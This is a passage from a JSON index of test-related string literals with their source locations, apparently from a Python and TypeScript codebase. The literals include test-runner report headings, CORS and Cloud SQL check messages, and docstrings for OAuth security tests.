      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:2"
      ]
    },
    "Business value test coverage report saved to": {
      "value": "Business value test coverage report saved to",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:727"
      ]
    },
    "By Priority:": {
      "value": "By Priority:",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:910"
      ]
    },
    "By Type:": {
      "value": "By Type:",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:914"
      ]
    },
    "CATEGORY STATISTICS": {
      "value": "CATEGORY STATISTICS",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:897"
      ]
    },
    "CI Check for Test Stubs in Production Code\n\nThis script runs as part of the CI/CD pipeline to detect test stubs in production code.\nIt fails the build if any test stubs are found according to SPEC/no_test_stubs.xml.\n\nUsage:\n    python scripts/ci/check_test_stubs.py          # Run check and exit with code\n    python scripts/ci/check_test_stubs.py --quiet  # Minimal output for CI": {
      "value": "CI Check for Test Stubs in Production Code\n\nThis script runs as part of the CI/CD pipeline to detect test stubs in production code.\nIt fails the build if any test stubs are found according to SPEC/no_test_stubs.xml.\n\nUsage:\n    python scripts/ci/check_test_stubs.py          # Run check and exit with code\n    python scripts/ci/check_test_stubs.py --quiet  # Minimal output for CI",
      "category": "test_literals",
      "locations": [
        "scripts/ci/check_test_stubs.py:2"
      ]
    },
    "CI Test Stub Checker": {
      "value": "CI Test Stub Checker",
      "category": "test_literals",
      "locations": [
        "scripts/ci/check_test_stubs.py:106"
      ]
    },
    "CLICKHOUSE_HOST": {
      "value": "CLICKHOUSE_HOST",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_startup.py:112",
        "scripts/test_staging_startup.py:218"
      ]
    },
    "CLICKHOUSE_PASSWORD": {
      "value": "CLICKHOUSE_PASSWORD",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:213"
      ]
    },
    "CLICKHOUSE_URL": {
      "value": "CLICKHOUSE_URL",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:80"
      ]
    },
    "CLOSED": {
      "value": "CLOSED",
      "category": "test_literals",
      "locations": [
        "frontend/components/chat/ConnectionStatusIndicator.test.tsx:16"
      ]
    },
    "CLOSING": {
      "value": "CLOSING",
      "category": "test_literals",
      "locations": [
        "frontend/components/chat/ConnectionStatusIndicator.test.tsx:17"
      ]
    },
    "COMPLETED": {
      "value": "COMPLETED",
      "category": "test_literals",
      "locations": [
        "scripts/iterative_test_fix_loop.py:158"
      ]
    },
    "COMPLETED:": {
      "value": "COMPLETED:",
      "category": "test_literals",
      "locations": [
        "auth_service/test_actual_staging_credentials.py:163"
      ]
    },
    "COMPLIANCE ANALYSIS": {
      "value": "COMPLIANCE ANALYSIS",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_violations_reporter.py:43"
      ]
    },
    "COMPONENT_MAPPINGS = {\n    \"backend\": {\n        \"paths\": [\"netra_backend/tests\"],\n        \"exclude\": [\"frontend\", \"auth_service\"]\n    },\n    \"frontend\": {\n        \"paths\": [\"frontend/__tests__\"],\n        \"exclude\": []\n    },\n    \"auth\": {\n        \"paths\": [\"netra_backend/tests/auth_integration\", \"auth_service/tests\"],\n        \"exclude\": []\n    },\n    \"agents\": {\n        \"paths\": [\"netra_backend/tests/agents\"],\n        \"exclude\": []\n    },\n    \"database\": {\n        \"paths\": [\"netra_backend/tests/database\", \"netra_backend/tests/clickhouse\"],\n        \"exclude\": []\n    },\n    \"websocket\": {\n        \"paths\": [\"netra_backend/tests/websocket\", \"netra_backend/tests/ws_manager\"],\n        \"exclude\": []\n    }\n}": {
      "value": "COMPONENT_MAPPINGS = {\n    \"backend\": {\n        \"paths\": [\"netra_backend/tests\"],\n        \"exclude\": [\"frontend\", \"auth_service\"]\n    },\n    \"frontend\": {\n        \"paths\": [\"frontend/__tests__\"],\n        \"exclude\": []\n    },\n    \"auth\": {\n        \"paths\": [\"netra_backend/tests/auth_integration\", \"auth_service/tests\"],\n        \"exclude\": []\n    },\n    \"agents\": {\n        \"paths\": [\"netra_backend/tests/agents\"],\n        \"exclude\": []\n    },\n    \"database\": {\n        \"paths\": [\"netra_backend/tests/database\", \"netra_backend/tests/clickhouse\"],\n        \"exclude\": []\n    },\n    \"websocket\": {\n        \"paths\": [\"netra_backend/tests/websocket\", \"netra_backend/tests/ws_manager\"],\n        \"exclude\": []\n    }\n}",
      "category": "test_literals",
      "locations": [
        "scripts/align_test_imports.py:278"
      ]
    },
    "COMPONENT_MAPPINGS\\s*=\\s*\\{[^}]+\\}": {
      "value": "COMPONENT_MAPPINGS\\s*=\\s*\\{[^}]+\\}",
      "category": "test_literals",
      "locations": [
        "scripts/align_test_imports.py:276"
      ]
    },
    "COMPREHENSIVE IMPORT TEST": {
      "value": "COMPREHENSIVE IMPORT TEST",
      "category": "test_literals",
      "locations": [
        "scripts/test_imports.py:68"
      ]
    },
    "COMPREHENSIVE TEST FIXER": {
      "value": "COMPREHENSIVE TEST FIXER",
      "category": "test_literals",
      "locations": [
        "scripts/comprehensive_test_fixer.py:289"
      ]
    },
    "COMPREHENSIVE TEST IMPORT FIX REPORT": {
      "value": "COMPREHENSIVE TEST IMPORT FIX REPORT",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_import_errors.py:307"
      ]
    },
    "COMPREHENSIVE TEST QUALITY REPORT": {
      "value": "COMPREHENSIVE TEST QUALITY REPORT",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/fake_test_scanner.py:248"
      ]
    },
    "CONNECTING": {
      "value": "CONNECTING",
      "category": "test_literals",
      "locations": [
        "frontend/components/chat/ConnectionStatusIndicator.test.tsx:15"
      ]
    },
    "CORS Configuration": {
      "value": "CORS Configuration",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_integration.py:118",
        "scripts/test_auth_integration.py:124",
        "scripts/test_staging_env.py:150"
      ]
    },
    "CORS configured:": {
      "value": "CORS configured:",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_env.py:111"
      ]
    },
    "CORS headers not properly configured": {
      "value": "CORS headers not properly configured",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_env.py:113"
      ]
    },
    "CORS test failed:": {
      "value": "CORS test failed:",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_integration.py:123",
        "scripts/test_staging_env.py:115"
      ]
    },
    "CORS validation test PASSED": {
      "value": "CORS validation test PASSED",
      "category": "test_literals",
      "locations": [
        "scripts/test_websocket_dev_mode.py:161"
      ]
    },
    "CORS validation test failed:": {
      "value": "CORS validation test failed:",
      "category": "test_literals",
      "locations": [
        "scripts/test_websocket_dev_mode.py:166"
      ]
    },
    "CORS_ORIGINS": {
      "value": "CORS_ORIGINS",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/config/test_env.py:54",
        "auth_service/tests/config/test_env.py:186",
        "auth_service/tests/config/test_settings.py:194"
      ]
    },
    "COVERAGE_ENABLED": {
      "value": "COVERAGE_ENABLED",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:200"
      ]
    },
    "CPU Intensive:": {
      "value": "CPU Intensive:",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:904"
      ]
    },
    "CPU Utilization:": {
      "value": "CPU Utilization:",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend_optimized.py:354"
      ]
    },
    "CRASHED:": {
      "value": "CRASHED:",
      "category": "test_literals",
      "locations": [
        "auth_service/test_actual_staging_credentials.py:168",
        "auth_service/test_url_construction.py:234"
      ]
    },
    "CREATE DATABASE \"": {
      "value": "CREATE DATABASE \"",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/database/test_config.py:134"
      ]
    },
    "CRITICAL": {
      "value": "CRITICAL",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/log_generator.py:72",
        "scripts/test_error_monitor_logic.py:35",
        "scripts/test_error_monitor_logic.py:63"
      ]
    },
    "CRITICAL (must fix)": {
      "value": "CRITICAL (must fix)",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_linter.py:119"
      ]
    },
    "CRITICAL FILES (Immediate Attention Required):": {
      "value": "CRITICAL FILES (Immediate Attention Required):",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/fake_test_scanner.py:280"
      ]
    },
    "CRITICAL GAPS:": {
      "value": "CRITICAL GAPS:",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:758"
      ]
    },
    "CRITICAL IMPORT TEST (Fast-Fail Mode)": {
      "value": "CRITICAL IMPORT TEST (Fast-Fail Mode)",
      "category": "test_literals",
      "locations": [
        "scripts/test_imports.py:82"
      ]
    },
    "CRITICAL violations** found:": {
      "value": "CRITICAL violations** found:",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:505"
      ]
    },
    "CRITICAL: Coverage below 80% - focus on unit test generation for core modules": {
      "value": "CRITICAL: Coverage below 80% - focus on unit test generation for core modules",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_reviewer.py:247"
      ]
    },
    "CRITICAL: Found": {
      "value": "CRITICAL: Found",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:444"
      ]
    },
    "CRITICAL: Run all tests immediately to verify nothing is broken!": {
      "value": "CRITICAL: Run all tests immediately to verify nothing is broken!",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:1009"
      ]
    },
    "CRITICAL: State parameter not stored - CSRF vulnerability!": {
      "value": "CRITICAL: State parameter not stored - CSRF vulnerability!",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_state_csrf_vulnerability.py:73"
      ]
    },
    "CSV report saved to": {
      "value": "CSV report saved to",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:513"
      ]
    },
    "Cache Hit Rate:": {
      "value": "Cache Hit Rate:",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend_optimized.py:351"
      ]
    },
    "Cache Hits:": {
      "value": "Cache Hits:",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend_optimized.py:337"
      ]
    },
    "Cache hit for query": {
      "value": "Cache hit for query",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/log_generator.py:98"
      ]
    },
    "Cache refreshed": {
      "value": "Cache refreshed",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/log_generator.py:129"
      ]
    },
    "Calculating cosine similarities...": {
      "value": "Calculating cosine similarities...",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:255"
      ]
    },
    "Cannot connect to PostgreSQL database": {
      "value": "Cannot connect to PostgreSQL database",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/auth-service-down-critical-scenarios.py:170"
      ]
    },
    "Cannot connect to Redis": {
      "value": "Cannot connect to Redis",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/auth-service-down-critical-scenarios.py:174"
      ]
    },
    "Cannot connect to accounts.google.com": {
      "value": "Cannot connect to accounts.google.com",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/auth-service-down-critical-scenarios.py:389"
      ]
    },
    "Cannot find file for module:": {
      "value": "Cannot find file for module:",
      "category": "test_literals",
      "locations": [
        "scripts/comprehensive_test_fixer.py:184"
      ]
    },
    "Cascade shutdown failure:": {
      "value": "Cascade shutdown failure:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_graceful_shutdown_failures.py:461"
      ]
    },
    "Cascading failure detected": {
      "value": "Cascading failure detected",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/log_generator.py:111"
      ]
    },
    "Case variant": {
      "value": "Case variant",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_database_failures.py:392"
      ]
    },
    "Categories Executed:": {
      "value": "Categories Executed:",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:694"
      ]
    },
    "Categories with History:": {
      "value": "Categories with History:",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:907"
      ]
    },
    "Categories with very few tests:": {
      "value": "Categories with very few tests:",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:478"
      ]
    },
    "Category '": {
      "value": "Category '",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:459",
        "scripts/analyze_test_overlap.py:465",
        "scripts/unified_test_runner.py:373"
      ]
    },
    "Category Results:": {
      "value": "Category Results:",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:696"
      ]
    },
    "Category failed": {
      "value": "Category failed",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:311"
      ]
    },
    "Category:": {
      "value": "Category:",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_mocks.py:179",
        "scripts/test_backend.py:364",
        "scripts/test_backend_optimized.py:126",
        "scripts/test_backend_optimized.py:424"
      ]
    },
    "CategoryFailure": {
      "value": "CategoryFailure",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:312"
      ]
    },
    "Certificate expires:": {
      "value": "Certificate expires:",
      "category": "test_literals",
      "locations": [
        "scripts/test_ssl_certificates_staging.py:84"
      ]
    },
    "Certificate issuer:": {
      "value": "Certificate issuer:",
      "category": "test_literals",
      "locations": [
        "scripts/test_ssl_certificates_staging.py:78"
      ]
    },
    "Certificate subject:": {
      "value": "Certificate subject:",
      "category": "test_literals",
      "locations": [
        "scripts/test_ssl_certificates_staging.py:77"
      ]
    },
    "Certificate version:": {
      "value": "Certificate version:",
      "category": "test_literals",
      "locations": [
        "scripts/test_ssl_certificates_staging.py:79"
      ]
    },
    "Changes made:": {
      "value": "Changes made:",
      "category": "test_literals",
      "locations": [
        "scripts/fix_e2e_test_imports.py:211"
      ]
    },
    "Character '": {
      "value": "Character '",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_state_security.py:235"
      ]
    },
    "Chat flow test failed:": {
      "value": "Chat flow test failed:",
      "category": "test_literals",
      "locations": [
        "scripts/test_cold_start_e2e.py:367"
      ]
    },
    "Check environment configuration": {
      "value": "Check environment configuration",
      "category": "test_literals",
      "locations": [
        "scripts/test_oauth_local.py:56"
      ]
    },
    "Check for inter-class dependencies": {
      "value": "Check for inter-class dependencies",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_refactor_helper.py:484"
      ]
    },
    "Check for memory leaks": {
      "value": "Check for memory leaks",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:397"
      ]
    },
    "Check health of backend and auth services": {
      "value": "Check health of backend and auth services",
      "category": "test_literals",
      "locations": [
        "scripts/test_oauth_local.py:98"
      ]
    },
    "Check if a service is healthy.": {
      "value": "Check if a service is healthy.",
      "category": "test_literals",
      "locations": [
        "scripts/test_cold_start_e2e.py:190"
      ]
    },
    "Check test dependencies before running": {
      "value": "Check test dependencies before running",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:510",
        "scripts/test_frontend.py:415"
      ]
    },
    "Check that setup_test_path() is called before any netra_backend imports in test files.": {
      "value": "Check that setup_test_path() is called before any netra_backend imports in test files.",
      "category": "test_literals",
      "locations": [
        "scripts/check_test_import_order.py:1"
      ]
    },
    "Check the error messages above for specific issues": {
      "value": "Check the error messages above for specific issues",
      "category": "test_literals",
      "locations": [
        "auth_service/test_staging_db_connection.py:323"
      ]
    },
    "Checked": {
      "value": "Checked",
      "category": "test_literals",
      "locations": [
        "scripts/check_test_import_order.py:82"
      ]
    },
    "Checking": {
      "value": "Checking",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_linter.py:243"
      ]
    },
    "Checking configuration...": {
      "value": "Checking configuration...",
      "category": "test_literals",
      "locations": [
        "scripts/test_example_message_flow.py:184"
      ]
    },
    "Checking dependencies...": {
      "value": "Checking dependencies...",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:338",
        "scripts/test_frontend.py:448"
      ]
    },
    "Checking for conftest.py violations...": {
      "value": "Checking for conftest.py violations...",
      "category": "test_literals",
      "locations": [
        "scripts/check_conftest_violations.py:70"
      ]
    },
    "Checking for syntax issues...": {
      "value": "Checking for syntax issues...",
      "category": "test_literals",
      "locations": [
        "scripts/align_test_imports.py:346"
      ]
    },
    "Checking for test stubs in production code...": {
      "value": "Checking for test stubs in production code...",
      "category": "test_literals",
      "locations": [
        "scripts/ci/check_test_stubs.py:34"
      ]
    },
    "Checking imports...": {
      "value": "Checking imports...",
      "category": "test_literals",
      "locations": [
        "scripts/test_example_message_flow.py:178",
        "scripts/test_example_message_flow.py:375"
      ]
    },
    "Checking service availability...": {
      "value": "Checking service availability...",
      "category": "test_literals",
      "locations": [
        "scripts/startup_test_executor.py:207"
      ]
    },
    "Checking tables after transaction...": {
      "value": "Checking tables after transaction...",
      "category": "test_literals",
      "locations": [
        "auth_service/debug_db_test.py:44"
      ]
    },
    "Circuit breaker opened for service": {
      "value": "Circuit breaker opened for service",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/log_generator.py:110"
      ]
    },
    "Circular env.ACT reference found": {
      "value": "Circular env.ACT reference found",
      "category": "test_literals",
      "locations": [
        "scripts/test_workflows_with_act.py:230"
      ]
    },
    "Classes:": {
      "value": "Classes:",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/demo_test_size_enforcement.py:90",
        "scripts/compliance/test_refactor_helper.py:708"
      ]
    },
    "Clean up Node processes on exit (automatic on Windows)": {
      "value": "Clean up Node processes on exit (automatic on Windows)",
      "category": "test_literals",
      "locations": [
        "scripts/test_frontend.py:423"
      ]
    },
    "Clean up all data for a specific user": {
      "value": "Clean up all data for a specific user",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/utils/test_helpers.py:297"
      ]
    },
    "Clean up excess sessions for specific user": {
      "value": "Clean up excess sessions for specific user",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_session_cleanup.py:68"
      ]
    },
    "Clean up hanging test processes": {
      "value": "Clean up hanging test processes",
      "category": "test_literals",
      "locations": [
        "scripts/cleanup_test_processes.py:146"
      ]
    },
    "Clean up resources": {
      "value": "Clean up resources",
      "category": "test_literals",
      "locations": [
        "scripts/test_oauth_local.py:429"
      ]
    },
    "Clean up resources.": {
      "value": "Clean up resources.",
      "category": "test_literals",
      "locations": [
        "scripts/test_cold_start_e2e.py:462"
      ]
    },
    "Cleaning up test processes...": {
      "value": "Cleaning up test processes...",
      "category": "test_literals",
      "locations": [
        "scripts/test_frontend.py:527"
      ]
    },
    "Cleanup cancelled.": {
      "value": "Cleanup cancelled.",
      "category": "test_literals",
      "locations": [
        "scripts/cleanup_test_processes.py:113"
      ]
    },
    "Cleanup created test data": {
      "value": "Cleanup created test data",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/utils/test_helpers.py:159"
      ]
    },
    "Cleanup database connections": {
      "value": "Cleanup database connections",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/database/test_config.py:61"
      ]
    },
    "Cleanup database objects": {
      "value": "Cleanup database objects",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/base/test_base.py:212"
      ]
    },
    "Cleanup error:": {
      "value": "Cleanup error:",
      "category": "test_literals",
      "locations": [
        "scripts/test_cold_start_e2e.py:477"
      ]
    },
    "Cleanup operation cancelled (this should happen)": {
      "value": "Cleanup operation cancelled (this should happen)",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_shutdown_timeouts.py:286"
      ]
    },
    "Cleanup operation not responding to SIGTERM": {
      "value": "Cleanup operation not responding to SIGTERM",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_shutdown_timeouts.py:281"
      ]
    },
    "Clear cache before execution": {
      "value": "Clear cache before execution",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend_optimized.py:385"
      ]
    },
    "Cleared Jest cache.": {
      "value": "Cleared Jest cache.",
      "category": "test_literals",
      "locations": [
        "scripts/cleanup_test_processes.py:134"
      ]
    },
    "Cleared cache directory:": {
      "value": "Cleared cache directory:",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend_optimized.py:407"
      ]
    },
    "Client ID format test: '": {
      "value": "Client ID format test: '",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_oauth_environment_failures.py:284"
      ]
    },
    "Client ID:": {
      "value": "Client ID:",
      "category": "test_literals",
      "locations": [
        "scripts/test_config_loading.py:105"
      ]
    },
    "Client Secret:": {
      "value": "Client Secret:",
      "category": "test_literals",
      "locations": [
        "scripts/test_config_loading.py:106"
      ]
    },
    "Cloud Run metadata command test - Service ID:": {
      "value": "Cloud Run metadata command test - Service ID:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_service_id_configuration_failures.py:275"
      ]
    },
    "Cloud Run shutdown completed in": {
      "value": "Cloud Run shutdown completed in",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_shutdown_timeouts.py:155"
      ]
    },
    "Cloud Run shutdown timeout - cleanup exceeded": {
      "value": "Cloud Run shutdown timeout - cleanup exceeded",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_shutdown_timeouts.py:160"
      ]
    },
    "Cloud Run staging not detected, got '": {
      "value": "Cloud Run staging not detected, got '",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_issues.py:128"
      ]
    },
    "Cloud SQL": {
      "value": "Cloud SQL",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_db_direct.py:80"
      ]
    },
    "Cloud SQL Configuration": {
      "value": "Cloud SQL Configuration",
      "category": "test_literals",
      "locations": [
        "scripts/test_database_url_builder_comprehensive.py:305"
      ]
    },
    "Cloud SQL Connector": {
      "value": "Cloud SQL Connector",
      "category": "test_literals",
      "locations": [
        "scripts/test_async_postgres.py:175"
      ]
    },
    "Cloud SQL URL (should remove SSL parameters)": {
      "value": "Cloud SQL URL (should remove SSL parameters)",
      "category": "test_literals",
      "locations": [
        "scripts/test_ssl_certificates_staging.py:109"
      ]
    },
    "Cloud SQL URL contains sslmode parameter": {
      "value": "Cloud SQL URL contains sslmode parameter",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_auth_ssl_failures.py:248"
      ]
    },
    "Cloud SQL URL must contain /cloudsql/ path": {
      "value": "Cloud SQL URL must contain /cloudsql/ path",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_database_credentials.py:243"
      ]
    },
    "Cloud SQL URL with SSL (should remove SSL)": {
      "value": "Cloud SQL URL with SSL (should remove SSL)",
      "category": "test_literals",
      "locations": [
        "scripts/test_database_url_builder_comprehensive.py:146"
      ]
    },
    "Cloud SQL database not exist error replicated:": {
      "value": "Cloud SQL database not exist error replicated:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_database_failures.py:187"
      ]
    },
    "Cloud SQL detected:": {
      "value": "Cloud SQL detected:",
      "category": "test_literals",
      "locations": [
        "auth_service/test_url_construction.py:81"
      ]
    },
    "Cloud SQL instance is not running or accessible": {
      "value": "Cloud SQL instance is not running or accessible",
      "category": "test_literals",
      "locations": [
        "auth_service/test_url_construction.py:201"
      ]
    },
    "Cloud SQL socket connection detected": {
      "value": "Cloud SQL socket connection detected",
      "category": "test_literals",
      "locations": [
        "auth_service/test_staging_db_connection.py:236"
      ]
    },
    "Code:": {
      "value": "Code:",
      "category": "test_literals",
      "locations": [
        "scripts/remove_test_stubs.py:333"
      ]
    },
    "Collected": {
      "value": "Collected",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:75"
      ]
    },
    "Command": {
      "value": "Command",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_migrations.py:253"
      ]
    },
    "Command: python": {
      "value": "Command: python",
      "category": "test_literals",
      "locations": [
        "scripts/test_verify_workflow_status.py:37",
        "scripts/test_verify_workflow_status_corrected.py:25"
      ]
    },
    "Commands": {
      "value": "Commands",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_refactor_helper.py:669"
      ]
    },
    "Complete coordination workflow successful": {
      "value": "Complete coordination workflow successful",
      "category": "test_literals",
      "locations": [
        "scripts/test_coordination_fixes.py:342"
      ]
    },
    "Complete workflow should succeed": {
      "value": "Complete workflow should succeed",
      "category": "test_literals",
      "locations": [
        "scripts/test_coordination_fixes.py:331"
      ]
    },
    "Complete workflow test failed:": {
      "value": "Complete workflow test failed:",
      "category": "test_literals",
      "locations": [
        "scripts/test_coordination_fixes.py:346"
      ]
    },
    "Complex async mocking required - tested in integration": {
      "value": "Complex async mocking required - tested in integration",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_database_manager.py:238"
      ]
    },
    "ComplexPassword@2024#WithLots$OfSpecialChars%": {
      "value": "ComplexPassword@2024#WithLots$OfSpecialChars%",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_password_hashing_basics.py:35"
      ]
    },
    "Compliance Rate:": {
      "value": "Compliance Rate:",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_violations_reporter.py:53"
      ]
    },
    "Compliant Files:": {
      "value": "Compliant Files:",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_violations_reporter.py:52"
      ]
    },
    "Component isolation tests (1-2min)": {
      "value": "Component isolation tests (1-2min)",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_config.py:31"
      ]
    },
    "Components:": {
      "value": "Components:",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/demo_test_size_enforcement.py:204"
      ]
    },
    "Comprehensive Fake Test Scan Results": {
      "value": "Comprehensive Fake Test Scan Results",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/fake_test_scanner.py:402"
      ]
    },
    "Comprehensive GitHub Workflows Testing with ACT\nTests all workflows locally to validate before pushing to GitHub": {
      "value": "Comprehensive GitHub Workflows Testing with ACT\nTests all workflows locally to validate before pushing to GitHub",
      "category": "test_literals",
      "locations": [
        "scripts/test_workflows_with_act.py:2"
      ]
    },
    "Comprehensive OAuth Authorization Code Reuse Prevention Tests\n\nTests the OAuth authorization code reuse prevention mechanisms in OAuthSecurityManager.\nValidates protection against replay attacks, concurrent usage, and proper expiration handling.\n\nSecurity Goals:\n- First use of authorization code succeeds\n- Subsequent uses are blocked (reuse attack prevention)\n- Concurrent attempts are properly handled\n- Memory store fallback works when Redis unavailable\n- Codes expire after 10 minutes\n- Race conditions are prevented": {
      "value": "Comprehensive OAuth Authorization Code Reuse Prevention Tests\n\nTests the OAuth authorization code reuse prevention mechanisms in OAuthSecurityManager.\nValidates protection against replay attacks, concurrent usage, and proper expiration handling.\n\nSecurity Goals:\n- First use of authorization code succeeds\n- Subsequent uses are blocked (reuse attack prevention)\n- Concurrent attempts are properly handled\n- Memory store fallback works when Redis unavailable\n- Codes expire after 10 minutes\n- Race conditions are prevented",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_authorization_code_reuse_prevention.py:1"
      ]
    },
    "Comprehensive OAuth Login Test Suite - Top 30 Common Failures\nTesting Level: L3-L4 (Real services with staging environment integration)\nInitially designed to FAIL to expose real implementation issues\n\nBusiness Value Justification (BVJ):\n- Segment: All (Free, Early, Mid, Enterprise)\n- Business Goal: Security, Retention, Platform Stability\n- Value Impact: Prevents auth failures that directly impact user access and trust\n- Strategic Impact: Critical for platform reliability and user retention\n\nTest Philosophy: L3-L4 Testing\n- L3: Real SUT with real containerized dependencies (PostgreSQL, Redis, etc.)\n- L4: Real SUT deployed in staging environment with all real services\n- Minimal mocking, maximum realism": {
      "value": "Comprehensive OAuth Login Test Suite - Top 30 Common Failures\nTesting Level: L3-L4 (Real services with staging environment integration)\nInitially designed to FAIL to expose real implementation issues\n\nBusiness Value Justification (BVJ):\n- Segment: All (Free, Early, Mid, Enterprise)\n- Business Goal: Security, Retention, Platform Stability\n- Value Impact: Prevents auth failures that directly impact user access and trust\n- Strategic Impact: Critical for platform reliability and user retention\n\nTest Philosophy: L3-L4 Testing\n- L3: Real SUT with real containerized dependencies (PostgreSQL, Redis, etc.)\n- L4: Real SUT deployed in staging environment with all real services\n- Minimal mocking, maximum realism",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:1"
      ]
    },
    "Comprehensive Test Fixer - Analyzes and fixes all test failures systematically": {
      "value": "Comprehensive Test Fixer - Analyzes and fixes all test failures systematically",
      "category": "test_literals",
      "locations": [
        "scripts/comprehensive_test_fixer.py:2"
      ]
    },
    "Comprehensive backend test runner for Netra AI Platform": {
      "value": "Comprehensive backend test runner for Netra AI Platform",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:434"
      ]
    },
    "Comprehensive backend test runner for Netra AI Platform\nDesigned for easy use by Claude Code and CI/CD pipelines\nNow with test isolation support for concurrent execution": {
      "value": "Comprehensive backend test runner for Netra AI Platform\nDesigned for easy use by Claude Code and CI/CD pipelines\nNow with test isolation support for concurrent execution",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:2"
      ]
    },
    "Comprehensive failing tests for AuthDatabaseManager missing methods.\n\nThese tests explicitly test for the missing methods that are being called\nin auth_service/auth_core/database/connection.py but don't exist in AuthDatabaseManager.\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal  \n- Business Goal: Auth service stability and reliability\n- Value Impact: Ensures critical methods exist and work correctly\n- Strategic Impact: Prevents auth service failures during database initialization": {
